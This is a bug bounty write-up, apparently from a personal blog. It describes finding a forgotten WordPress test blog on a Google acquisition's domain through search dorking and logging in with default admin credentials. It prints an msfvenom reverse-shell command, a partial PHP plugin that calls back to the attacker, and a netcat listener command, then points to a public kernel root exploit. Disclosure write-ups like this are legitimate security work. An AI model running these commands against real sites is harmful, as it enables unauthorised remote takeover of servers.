### TL;DR
Default Wordpress credentials on an old version of the Adometry blog would have allowed an attacker to upload a PHP shell and execute remote commands.

### Google dorking
Instead of studying for the exams last month I tryed to discover some bugs in a Google Acquisition to get my name listed on the **Google Hall of Fame**. The acquisition which I have targeted is **Adometry by Google** a SaaS-based marketing attribution and optimization platform. Looking around on their website I have discovered the company blog located at [http://www.adometry.com/blog/](http://www.adometry.com/blog/) which runs the **latest version of Wordpress**.
Since the bugs are often located in hidden and old pages of the website let's give them a look. A very useful way to discover these pages is Google itself. Using some operands like ``site:`` or ``inurl:`` and combining these with the ``interval of dates filter`` it is possible to discover old pages of a particular website. Let's try it: ``site:adometry.com`` and set the interval of date in the past but not that much. Besides the pages which simply redirect to the main website I have noticed something strange:

### The Wordpress test blog
The first thing that I have noticed was the title of the blog  **Test | Just another WordPress site - Adometry** which contains the magic keyword that every Penetration Tester/Bug Hunter is looking for: **Test** that in many case means vulnerable as hell. The second thing that I have noticed is that the url of this blog [http://www.adometry.com/blog2013/](http://www.adometry.com/blog2013/) is different from the official one that I have discovered before. By inspecting the source code of the page I discovered that the **Wordpress version was the 3.5.1** that has a lot of vulnerabilities like XSS XXE CSRF and maybe a [RCE](https://vagosec.org/2013/12/wordpress-rce-exploit/), but  I am a lazy guy, out there it was very hot, and I would like to go for a swim so I tryed to find an easier way in. I know for sure this was just a testing blog and so what are the **classical credetials** for a testing thing? The default ones and in the case of Wordpress the classical **admin:admin**. Let's give them a shot and here we are:

### Getting a shell
The easiest way to get a shell once you have admin access to a Wordpress blog is to **upload a custom plugin** containing a reverse shell, enable it and visit the page which runs it:

- Create a **php reverse shell** using msfvenom and name the file shell.php:

<code >
msfvenom -p php/meterpreter_reverse_tcp LHOST=Your IP LPORT=Your Port -f raw > shell.php
</code>

- Add comments on the top of the shell.php to **make it a valid plugin** and compress it in zip format
{% highlight php %}
<?php
/*
*     Plugin Name: My Shell
*     Plugin URI: https://github.com/r0rshark/wordpress-shell
*     Description: Execute Commands as the webserver you are serving wordpress with
*     Author: r0rshark
*     Version: 0.2
*     Author URI: https://r0rshark.github.io
*                             */
    $ipaddr='Your IP';
    $port=Your Port;

      @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
      $dis=@ini_get('disable_functions');
      ...
      ?>
{% endhighlight %}
- **Upload and enable the plugin** in the Wordpress dashboard
<div class="full zoomable">
  <img src="/images/google/wordpress_plugin.png">
</div>

- **Setup a listener** at your ip and port used in the msfvenom command:

<code >
nc -lvp port
</code>

- **Execute the reverse shell** by visiting www.adometry.com/blog2013/wp-content/plugins/shell/shell.php

### Maybe getting root
In the previous picture it is possible to see the current kernel version running on that machine which is the **2.6.32**. I think that there are known **public exploits** to get a root shell exploiting vulnerabilities in this kernel version. For example I have tested  [this](https://www.exploit-db.com/exploits/15704/) on a 2.6.31 kernel and since the exploit has been created to work with kernel < 2.6.37 I suppose that it can work as well. Obviously I haven't tried it because I think this would go beyond of the Bug Bounty scope.
